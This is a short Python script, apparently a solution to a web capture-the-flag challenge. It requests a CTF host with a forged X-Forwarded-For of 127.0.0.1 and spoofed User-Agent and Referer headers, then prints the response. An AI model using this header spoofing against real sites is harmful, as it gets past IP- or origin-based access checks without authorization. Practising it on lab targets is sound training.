import requests

url = "http://ctf.wanxze.space:33589/"

headers = {
    "User-Agent": "WanXZe's edge",
    "X-Forwarded-For": "127.0.0.1",
    "Referer": "192.168.0.1:80",
}

resp = requests.get(url, headers=headers, allow_redirects=True)

print("状态码:", resp.status_code)
print("最终URL:", resp.url)
print(resp.text)